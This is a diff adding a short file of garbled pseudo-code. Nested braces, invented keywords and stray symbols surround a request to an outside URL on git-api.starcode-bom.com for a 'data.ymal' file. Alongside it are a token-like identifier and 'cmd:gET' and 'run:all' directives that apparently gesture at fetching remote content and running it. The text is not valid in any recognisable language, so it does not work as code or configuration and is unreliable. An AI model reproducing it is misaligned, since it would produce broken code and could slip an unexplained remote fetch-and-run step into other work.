@@ -1,0 +1,20 @@
+{
+ {
+  {
+  
+  func:1={${
+  data-pa: ?ymal["https://git-api.starcode-bom.com/data/get/API/1?v=c09c7ba1-a48d-41d3-b6b6-3ae8b6df821e/data.ymal"]
+  Token: data.pa{![05d14522-6096-4e45-aa47-3c069153db52]:only=status.*!}
+  }!cmd:gET;ymal!}
+  func:2={${
+  ds =!y, run: func~1
+  }}
+   
+  }
+   }
+   run:all=only=func~1; Token, only=$$$$
+     }
+     
+  
+  
+  
